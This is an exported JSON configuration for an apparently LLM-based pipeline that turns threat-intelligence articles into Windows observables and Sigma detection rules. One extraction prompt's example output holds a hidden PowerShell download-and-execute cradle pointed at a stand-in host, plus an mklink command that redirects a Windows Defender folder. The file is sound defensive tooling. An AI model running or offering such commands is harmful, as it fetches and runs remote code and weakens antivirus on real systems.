{
  "Version": "2.0",
  "Metadata": {
    "CreatedAt": "2026-02-23T00:24:03Z",
    "Description": "Exported preset"
  },
  "JunkFilter": {
    "JunkFilterThreshold": 0.8
  },
  "QASettings": {
    "MaxRetries": 3
  },
  "Thresholds": {
    "MinHuntScore": 97.0,
    "AutoTriggerHuntScoreThreshold": 60.0
  },
  "OSDetection": {
    "Embedding": "ibm-research/CTI-BERT",
    "FallbackEnabled": true,
    "Fallback": {
      "Provider": "anthropic",
      "Model": "claude-sonnet-4-5",
      "Temperature": 0.0,
      "TopP": 0.9
    },
    "SelectedOs": [
      "Windows"
    ],
    "Prompt": {
      "prompt": "",
      "instructions": ""
    }
  },
  "RankAgent": {
    "Enabled": true,
    "Provider": "anthropic",
    "Model": "claude-sonnet-4-5",
    "Temperature": 0.0,
    "TopP": 0.9,
    "RankingThreshold": 6.0,
    "Prompt": {
      "prompt": "Task: Analyze this threat intelligence article and score it 1-10 for SIGMA detection rule potential.\n\nInstructions:\n- DO NOT score for: Single IPs, single domains, file hashes, single URLs without patterns\n- DO score for: Patterns, command-line chains, process sequences, registry patterns, network patterns (DGA, URL paths), behavioral combinations\n\nScoring:\n- 7-10: Specific technical patterns (commands, registry, files, processes, network patterns)\n- 4-6: Some technical patterns but limited\n- 1-3: Strategic content, minimal patterns, or only atomic IOCs\n\nREQUIRED OUTPUT FORMAT - Start your response with:\nSIGMA HUNTABILITY SCORE: [NUMBER]\n\nExample:\nSIGMA HUNTABILITY SCORE: 8\nREASONING: This article describes specific command-line execution patterns and registry modifications.\n\nArticle Title: {title}\nSource: {source}\nArticle Content:\n{content}\n\nNow analyze and respond with your score following the format above.",
      "instructions": ""
    },
    "QAEnabled": true,
    "QA": {
      "Provider": "anthropic",
      "Model": "claude-sonnet-4-5",
      "Temperature": 0.1,
      "TopP": 0.9
    },
    "QAPrompt": {
      "prompt": "",
      "instructions": ""
    }
  },
  "ExtractAgent": {
    "Provider": "anthropic",
    "Model": "claude-sonnet-4-5",
    "Temperature": 0.0,
    "TopP": 0.9,
    "Prompt": {
      "prompt": "{\n  \"role\": \"System: You are a detection engineer LLM. Extract telemetry-aware attacker techniques and observables suitable for Windows detection/hunting. Obey all constraints and output JSON only.\",\n  \"objective\": \"Extract only telemetry-based observables: command lines with arguments, parent→child process chains, registry key/value operations, service manipulation, suspicious file paths/locations, event log manipulation, encoded/obfuscated values. Output unique and discrete entries only.\",\n  \"exclusions\": {\n    \"do_not_extract\": [\n      \"Atomic IOCs (single IPs/domains/file hashes/URLs) without patterns\",\n      \"One-off URLs or email addresses without recognizable structure or patterns\",\n      \"Narrative text without telemetry value\"\n    ],\n    \"do_extract\": [\n      \"Command-line executions (with switches/arguments, including cmd.exe /c chains)\",\n      \"Parent → child process chains with optional arguments/context\",\n      \"Registry key/value modification patterns (add/delete/set) with full paths\",\n      \"Service manipulation (creation, deletion, status change)\",\n      \"Suspicious file paths or uncommon locations\",\n      \"Event log deletion or manipulation\",\n      \"Encoded or obfuscated values\"\n    ]\n  },\n  \"output_format\": {\n    \"behavioral_observables\": \"Array of unique observables with type tag (e.g., process_cmdline, registry_pattern, service_command) and optional context\",\n    \"observable_list\": \"Array of raw observable strings (deduplicated, plaintext)\",\n    \"detection_queries\": \"Optional array of KQL/Sigma-like query fragments if explicitly present\",\n    \"url\": \"Source URL of the original content\",\n    \"content\": \"Concise extracted raw text that includes only observables (no prose)\",\n    \"discrete_huntables_count\": \"Integer count of unique discrete observables\"\n  },\n  \"platform_coverage\": {\n    \"valid_sources\": [\n      \"Windows: Sysmon, Security Event Logs\"\n    ]\n  },\n  \"constraints\": [\n    \"Grounding: every observable must be explicitly present in the source text. Do not invent or complete partial data.\",\n    \"Windows focus: prefer Windows telemetry; ignore non-Windows signals unless clearly relevant.\",\n    \"Arguments: include arguments/switches where present; avoid bare executable names.\",\n    \"Parent/child: include parent→child linkage when available.\",\n    \"Deduplication: output unique items only; no placeholders unless the article literally contains one.\",\n    \"Empty categories are allowed—do not fabricate to fill them.\"\n  ],\n  \"output_schema\": {\n    \"behavioral_observables\": [\n      {\n        \"type\": \"process_cmdline | registry_pattern | service_command | event_log_action | file_path | other_behavior\",\n        \"value\": \"<string from text>\",\n        \"context\": \"<short source excerpt>\",\n        \"parent\": \"<optional parent proc>\",\n        \"child\": \"<optional child proc>\",\n        \"arguments\": \"<optional args>\"\n      }\n    ],\n    \"observable_list\": [\"<string>\"],\n    \"detection_queries\": [\"<string>\"],\n    \"url\": \"<string>\",\n    \"content\": \"<string>\",\n    \"discrete_huntables_count\": \"integer\"\n  },\n  \"instructions\": \"USER: Title: {title}\\\\nURL: {url}\\\\nContent:\\\\n{content}\\\\n\\\\nFollow SYSTEM constraints. Extract only grounded, Windows-telemetry observables and behaviors. Keep unique items. Output a single valid JSON object only—no markdown, no code fences, no prose outside JSON.\"\n}",
      "instructions": ""
    }
  },
  "CmdlineExtract": {
    "Enabled": true,
    "Provider": "anthropic",
    "Model": "claude-sonnet-4-5",
    "Temperature": 0.0,
    "TopP": 0.9,
    "Prompt": {
      "prompt": "{\n  \"role\": \"You are a deterministic Windows command-line extraction agent for cyber threat intelligence (CTI) articles.\\n\\nMODEL TARGET:\\nOptimized for Qwen3-14B.\\n/no_think\\nThis is a literal pattern-matching extraction task.\\nDo NOT reason, explain, infer, normalize, summarize, or reconstruct.\",\n  \"user_template\": \"Title: {title}\\nURL: {url}\\n\\nContent:\\n{content}\\n\\n{instructions}\",\n  \"task\": \"Extract ONLY complete, literal, hunt-relevant Windows command-line observables that appear verbatim in the provided content.\",\n  \"json_example\": \"{\\n  \\\"cmdline_items\\\": [\\n    \\\"cmd.exe /c mklink /D \\\\\\\"C:\\\\\\\\ProgramData\\\\\\\\roming\\\\\\\" \\\\\\\"C:\\\\\\\\ProgramData\\\\\\\\Microsoft\\\\\\\\Windows Defender\\\\\\\\Platform\\\\\\\\4.18.25050.5-0\\\\\\\"\\\",\\n    \\\"powershell -w hidden -nop -ep bypass -c \\\\\\\"IEX (New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')\\\\\\\"\\\"\\n  ],\\n  \\\"count\\\": 2\\n}\",\n  \"instructions\": \"========================\\nCORE MISSION (NON-NEGOTIABLE)\\n========================\\nExtract ONLY complete, literal, hunt-relevant Windows command-line observables that appear verbatim in the provided content.\\n\\nOutput feeds automated detection engineering (hunts, analytics, Sigma).\\nIf it cannot be hunted, it MUST NOT appear.\\n\\n========================\\nGLOBAL OUTPUT RULES\\n========================\\n1) Output ONLY valid JSON.\\n2) No explanations, reasoning, markdown, comments, or extra text.\\n3) JSON MUST be parseable by json.loads().\\n4) Response MUST start with { and end with }.\\n5) Escape Windows backslashes for JSON (each \\\\ becomes \\\\\\\\).\\n6) Preserve original casing, spacing, quoting, and ordering EXACTLY.\\n7) Deduplicate ONLY exact string matches.\\n\\n========================\\nREQUIRED OUTPUT SCHEMA\\n========================\\n{\\n  \\\"cmdline_items\\\": [string, ...],\\n  \\\"count\\\": integer\\n}\\n\\nIf no valid commands are found, output EXACTLY:\\n{\\\"cmdline_items\\\":[],\\\"count\\\":0}\\n\\n========================\\nDEFINITION: VALID COMMAND LINE\\n========================\\nA command line is valid ONLY if ALL conditions below are met.\\n\\nA) LITERAL PRESENCE\\n- Appears verbatim in the article content.\\n- May appear in inline code, code blocks, quoted text, plaintext, tables, or lists.\\n- Line-wrapped labeled fields (e.g., \\\"CommandLine:\\\") are treated as one command.\\n- NO inference, reconstruction, or paraphrasing.\\n\\nB) WINDOWS EXECUTION CONTEXT\\n- MUST be Windows-centric.\\n- MUST include ONE of:\\n  - A Windows executable (.exe, .bat, .cmd)\\n  - A native Windows built-in utility invoked as a command\\n    (e.g., cmd.exe, powershell.exe, net.exe, nltest.exe, rundll32.exe,\\n     wbadmin.exe, reg.exe, sc.exe, schtasks.exe, wmic.exe, msbuild.exe,\\n     certutil.exe, mshta.exe, wscript.exe, cscript.exe)\\n\\nC) SPACE INVARIANT (HIGHEST PRIORITY)\\n- The extracted command-line string MUST contain at least ONE ASCII space character (\\\" \\\").\\n- This space MUST separate the executable/utility from an argument, switch, parameter, or chained command.\\n- Any single-token string (no spaces) is INVALID, even if it names a Windows executable or utility.\\n- This rule OVERRIDES semantic argument interpretation.\\n\\nD) NON-TRIVIAL INVOCATION (SECONDARY)\\n- MUST include at least ONE:\\n  argument, switch, flag, parameter, pipeline (|), or redirection (>, >>).\\n- This requirement is enforced AFTER the space invariant.\\n\\nE) HUNTABLE SIGNAL\\n- Represents a real process-creation execution observable.\\n- Atomic IOCs (file paths alone, DLL paths alone) are INVALID.\\n- Tool names or capability descriptions without execution syntax are INVALID.\\n\\n========================\\nCMD.EXE & CHAINING RULES\\n========================\\n- Commands chained with &&, &, ||, or | are ONE command-line.\\n- Example:\\n  cmd.exe /c echo test && whoami && ipconfig /all\\n  → extract as a single command-line.\\n\\n- Wrappers (cmd.exe /c, cmd.exe /Q /c):\\n  - Preserve ONLY if they appear literally in the text.\\n  - Do NOT strip or normalize wrappers.\\n\\n========================\\nPOWERSHELL RULES\\n========================\\n- PowerShell is valid ONLY if explicitly invoked\\n  (powershell.exe, powershell, or pwsh).\\n- Cmdlet names alone are INVALID.\\n- Inline scripts are preserved exactly as written.\\n- -EncodedCommand is valid; extract full base64 string intact.\\n- Do NOT decode, deobfuscate, or expand.\\n\\n========================\\nRUNDLL32 RULES\\n========================\\n- Valid ONLY if both DLL path and exported function are explicitly shown.\\n\\n========================\\nMULTI-LINE & CONTINUATION HANDLING\\n========================\\n- cmd.exe / batch:\\n  - Lines ending with ^ → remove ^ and join with next line using a single space.\\n- PowerShell:\\n  - Lines ending with ` → remove ` and join with next line using a single space.\\n- Sysmon / telemetry fields:\\n  - Multi-line \\\"CommandLine:\\\" fields → join with single spaces.\\n- After joining, the result MUST still contain at least one space and meet all validity rules.\\n\\n========================\\nOBFUSCATION & VARIABLES\\n========================\\n- Extract obfuscated commands EXACTLY as shown.\\n- Do NOT decode base64, expand variables, or resolve paths.\\n- Environment variables (%TEMP%, %APPDATA%, $env:*) are preserved as-is.\\n\\n========================\\nEXPLICIT EXCLUSIONS\\n========================\\nDO NOT extract:\\n- Any string with NO spaces (single-token strings).\\n- Bare commands with no arguments (e.g., whoami, ipconfig, nltest).\\n- Filenames without execution context (e.g., svchost.exe).\\n- File paths alone (e.g., C:\\\\Windows\\\\Temp\\\\1.exe).\\n- Registry keys or values.\\n- URLs alone.\\n- API calls without visible command lines (e.g., WScript.Shell.Run()).\\n- Descriptions of behavior without literal commands.\\n- Partial fragments missing the executable or arguments.\\n- Non-Windows commands (Linux/macOS utilities).\\n\\n========================\\nFINAL VALIDATION (MANDATORY)\\n========================\\nBefore outputting:\\n- Verify each item appears verbatim in the content.\\n- Verify each item contains at least one ASCII space character (\\\" \\\").\\n- Verify Windows execution context is present.\\n- Verify no exclusions apply.\\n- If ANY doubt exists, EXCLUDE the item.\\n\\nOutput ONLY the JSON object.\"\n}",
      "instructions": ""
    },
    "QAEnabled": true,
    "QA": {
      "Provider": "anthropic",
      "Model": "claude-sonnet-4-5",
      "Temperature": 0.1,
      "TopP": 0.9
    },
    "QAPrompt": {
      "prompt": "",
      "instructions": ""
    },
    "AttentionPreprocessor": true
  },
  "ProcTreeExtract": {
    "Enabled": true,
    "Provider": "anthropic",
    "Model": "claude-sonnet-4-5",
    "Temperature": 0.0,
    "TopP": 0.9,
    "Prompt": {
      "prompt": "{\n  \"role\": \"You are a specialized detection engineer focused on process execution chains.\",\n  \"objective\": \"Extract process lineage relationships (parent-child process executions) described in the text.\",\n  \"exclusions\": {\n    \"do_not_extract\": [\n      \"Single processes without a clear parent/child relationship mentioned\",\n      \"Generic statements like 'malware runs commands'\"\n    ]\n  },\n  \"output_format\": {\n    \"process_lineage\": \"Array of objects: {'parent': 'cmd.exe', 'child': 'powershell.exe', 'arguments': '...optional...', 'context': '...brief context...'}\",\n    \"count\": \"Integer count of relationships found\"\n  },\n  \"instructions\": \"Identify specific mentions of one process spawning another (e.g., 'macros spawning cmd.exe', 'services.exe launching malware.exe'). capturing the parent and child process names. Output valid JSON.\"\n}",
      "instructions": ""
    },
    "QAEnabled": true,
    "QA": {
      "Provider": "anthropic",
      "Model": "claude-sonnet-4-5",
      "Temperature": 0.1,
      "TopP": 0.9
    },
    "QAPrompt": {
      "prompt": "{\n  \"role\": \"System: You are a QA specialist for process lineage extraction. Enforce grounding; do not infer relationships without evidence.\",\n  \"objective\": \"Verify that extracted parent-child process relationships (and arguments/context when present) are explicitly supported by the text.\",\n  \"input_format\": {\n    \"source_text\": \"<verbatim source>\",\n    \"extracted_lineage\": \"<extracted JSON>\"\n  },\n  \"evaluation_criteria\": [\n    \"✅ Parent-child relationships are explicitly stated or clearly implied in the text.\",\n    \"✅ Process names and arguments match the text.\",\n    \"❌ No inferred relationships without evidence.\"\n  ],\n  \"instructions\": \"USER: Compare extracted_lineage to source_text. Flag any missing or invented parent-child edges. Output JSON only: {\\\"status\\\": \\\"pass|fail|needs_revision\\\", \\\"summary\\\": \\\"...\\\", \\\"issues\\\": [{\\\"type\\\": \\\"compliance|completeness\\\", \\\"description\\\": \\\"...\\\", \\\"severity\\\": \\\"low|medium|high\\\"}], \\\"corrections\\\": {\\\"removed\\\": [...], \\\"added\\\": [...]}}.\"\n}",
      "instructions": ""
    }
  },
  "HuntQueriesExtract": {
    "Enabled": true,
    "Provider": "anthropic",
    "Model": "claude-sonnet-4-5-20250929",
    "Temperature": 0.0,
    "TopP": 0.9,
    "Prompt": {
      "prompt": "{\n  \"role\": \"You are a specialized detection engineer focused on extracting explicit hunting queries from threat intelligence.\",\n  \"objective\": \"Extract any explicit hunting queries (EDR queries like KQL, Splunk, Elastic) found in the text.\",\n  \"exclusions\": {\n    \"do_not_extract\": [\n      \"Generic text descriptions of detection logic (unless it mimics a pseudo-code query)\",\n      \"Atomic IOCs (IPs, Hashes) unless part of a query string\",\n      \"Command lines without query syntax\",\n      \"Narrative descriptions of hunting techniques without actual queries\",\n      \"SIGMA detection rules (these are handled by a separate extractor)\"\n    ]\n  },\n  \"output_format\": {\n    \"query_count\": \"Integer count of EDR queries extracted (KQL, Splunk, Elastic, Falcon, SentinelOne, etc.)\",\n    \"queries\": \"Array of objects: {'query': '<verbatim query string>', 'type': 'kql|splunk|elastic|falcon|sentinelone|other', 'context': '<brief source context>' (optional)}\"\n  },\n  \"instructions\": \"Analyze the text for code blocks and query examples. Extract EDR queries (KQL, Splunk, Elastic, etc.) verbatim. If a query is broken across lines, join it if obvious. Preserve original syntax, formatting, and structure. Output valid JSON only.\"\n}",
      "instructions": ""
    },
    "QAEnabled": true,
    "QA": {
      "Provider": "anthropic",
      "Model": "claude-sonnet-4-5-20250929",
      "Temperature": 0.1,
      "TopP": 0.9
    },
    "QAPrompt": {
      "prompt": "{\n  \"role\": \"System: You are a QA specialist validating hunting query extractions. Enforce grounding and correctness; do not invent queries.\",\n  \"objective\": \"Verify that extracted hunting queries exist in the source text, match the source syntax/category, and are not hallucinated.\",\n  \"input_format\": {\n    \"source_text\": \"<verbatim source>\",\n    \"extracted_queries\": \"<extracted JSON>\"\n  },\n  \"evaluation_criteria\": [\n    \"✅ Extracted queries appear literally or structurally in the source text.\",\n    \"✅ Query category/type (e.g., KQL, Splunk, Sigma, Elastic) matches the source.\",\n    \"✅ Query syntax is valid for the claimed type.\",\n    \"❌ No hallucinated queries or syntax not present in the source.\",\n    \"⚠️ Missing queries from code blocks or examples are identified and added.\"\n  ],\n  \"instructions\": \"USER: Compare extracted_queries to source_text. If missing or miscategorized, flag issues. Output JSON only: {\\\"status\\\": \\\"pass|fail|needs_revision\\\", \\\"summary\\\": \\\"...\\\", \\\"issues\\\": [{\\\"type\\\": \\\"compliance|completeness|syntax\\\", \\\"description\\\": \\\"...\\\", \\\"severity\\\": \\\"low|medium|high\\\"}], \\\"corrected_queries\\\": {\\\"added\\\": [{\\\"query\\\": \\\"...\\\", \\\"type\\\": \\\"...\\\", \\\"reason\\\": \\\"...\\\", \\\"found_in\\\": \\\"...\\\"}], \\\"removed\\\": [{\\\"query\\\": \\\"...\\\", \\\"reason\\\": \\\"...\\\"}]}}.\"\n}",
      "instructions": ""
    }
  },
  "SigmaAgent": {
    "Provider": "anthropic",
    "Model": "claude-sonnet-4-5",
    "Temperature": 0.0,
    "TopP": 0.9,
    "SimilarityThreshold": 0.5,
    "UseFullArticleContent": false,
    "Prompt": {
      "prompt": "Generate Sigma detection rules from the following threat intelligence. Produce multiple rules if the behaviors differ.\n\nThreat Intel Input:\n- title: {title}\n- source: {source}\n- url: {url}\n- content: {content}\n\nObjectives:\n- Extract every distinct behavioral TTP (command execution, process lineage, persistence, defense evasion, system modification).\n- Create 1 rule per behavior when possible.\n- Extract all command-line patterns with arguments; include all unique process-creation observables.\n\nStrict SIGMA Requirements:\n- Focus on behaviors, not atomic IOCs.\n- Use correct syntax and required fields.\n- Avoid rules for single IPs, hashes, or filenames alone.\n- Prefer command-line, parent/child relationships, LOLBins, system changes, scripting engine abuse, lateral movement, etc.\n- Use correct logsource for each behavior (process_creation, network_connection, registry_event, file_event, etc.).\n\nOutput Rules:\n- Output ONLY valid YAML.\n- NO prose, explanations, comments, or narrative text of any kind.\n- NO phrases like \"Okay, let's tackle this\" or \"Looking at the content:\" or \"Here's the rule:\".\n- NO code fences (no ```yaml or ``` markers).\n- Start your response immediately with `title:` - nothing before it.\n- 2-space indentation only; no tabs.\n- All field names lowercase.\n\nCRITICAL: Your response will be parsed by pySIGMA validator. If you include ANY narrative text before or within the YAML, validation will fail with \"mapping values are not allowed here\". Output ONLY the YAML rule structure.\n\nRequired Structure:\ntitle: [descriptive rule title]\nid: [UUID]\ndescription: [behavior detected]\nlogsource:\n  category: [process_creation/network_connection/registry_event/...]\n  product: [windows/linux/macos]\ndetection:\n  selection:\n    [criteria]\n  condition: selection\nlevel: [low/medium/high/critical]\ntags:\n  - attack.[technique]\nreferences:\n  - {url}\n\nBehavioral Extraction Rules:\n- For process creation TTPs: include all command-line patterns with args; include parent-child relationships when inferable; include LOLBin/scripting abuse.\n- For system modification: include registry, services, scheduled tasks.\n- For defense evasion: include AV disablement, AMSI bypass, obfuscation flags.\n\nFinal Instruction:\nGenerate all applicable SIGMA rules from the threat intelligence above.",
      "instructions": ""
    }
  }
}